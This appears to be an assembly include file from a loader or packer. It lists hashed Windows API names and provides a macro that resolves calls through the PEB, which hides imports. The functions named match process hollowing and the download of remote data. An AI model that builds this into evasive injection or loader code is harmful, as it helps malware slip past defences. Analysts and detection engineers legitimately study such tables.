; Module hashes
PEB_NtdllDll							= 0x3cfa685d
PEB_Kernel32Dll							= 0x6a4abc5b
PEB_KernelbaseDll						= 0x2defbae3
PEB_User32Dll							= 0x63c84283
PEB_Shell32Dll							= 0x40f1a814
PEB_ShlwapiDll							= 0x9bac604d
PEB_WininetDll							= 0xe218ba5b

; Function hashes (ntdll.dll)
PEB_RtlAllocateHeap						= 0x3e192526
PEB_RtlReAllocateHeap					= 0xad6b8cc4
PEB_NtQueryInformationProcess			= 0xb10fd839
PEB_NtUnmapViewOfSection				= 0xf21037d0
PEB_RtlDecompressBuffer					= 0xfd46a728
PEB_NtGetContextThread					= 0xe935e393
PEB_NtSetContextThread					= 0x6935e395

; Function hashes (kernel32.dll)
PEB_lstrlenW							= 0xdd434751
PEB_lstrcpyW							= 0xcb9b4a11
PEB_lstrcatW							= 0xcb734651
PEB_LoadLibraryW						= 0xec0e4ea4
PEB_GetCommandLineW						= 0x36ef7386
PEB_GetProcAddress						= 0x7c0dfcaa
PEB_GetProcessHeap						= 0xa80eecae
PEB_HeapFree							= 0x10c32616
PEB_CloseHandle							= 0x0ffd97fb
PEB_GetLastError						= 0x75da1966
PEB_GetTempPathW						= 0x5b8aca49
PEB_CreateFileW							= 0x7c0017bb
PEB_WriteFile							= 0xe80a791f
PEB_DeleteFileW							= 0xc2ffb03b
PEB_GetModuleFileNameW					= 0x45b06d8c
PEB_Wow64DisableWow64FsRedirection		= 0x3a2ea97f
PEB_CreateProcessW						= 0x16b3fe88
PEB_OpenProcess							= 0xefe297c0
PEB_TerminateProcess					= 0x78b5b983
PEB_VirtualAllocEx						= 0x6e1a959c
PEB_WriteProcessMemory					= 0xd83d6aa1
PEB_GetThreadContext					= 0x68a7c7d2
PEB_SetThreadContext					= 0xe8a7c7d3
PEB_ResumeThread						= 0x9e4a3f88
PEB_ExitProcess							= 0x73e2d87e

; Function hashes (kernelbase.dll)
PEB_InitializeProcThreadAttributeList	= 0xde64ceff
PEB_UpdateProcThreadAttribute			= 0x41e5d7cb

; Function hashes (user32.dll)
PEB_MessageBoxA							= 0xbc4da2a8
PEB_MessageBoxW							= 0xbc4da2be

; Function hashes (shell32.dll)
PEB_ShellExecuteW						= 0x1be1bb74
PEB_SHGetFolderPathW					= 0x3745c87d
PEB_SHGetKnownFolderPath				= 0xde8e51ad

; Function hashes (shlwapi.dll)
PEB_PathFindFileNameW					= 0x6203fd72
PEB_PathCombineW						= 0xff8de486

; Function hashes (wininet.dll)
PEB_InternetOpenW						= 0x57e8443f
PEB_InternetOpenUrlW					= 0x7e0fed5f
PEB_InternetCloseHandle					= 0xfa9b69c7
PEB_InternetReadFile					= 0x5fe34b8b

macro pebcall modulehash, functionhash, [arg]
{
	common
	if ~ arg eq
		reverse
		pushd arg
		common
	end if

	stdcall	PebGetProcAddress, modulehash, functionhash
	call	eax
}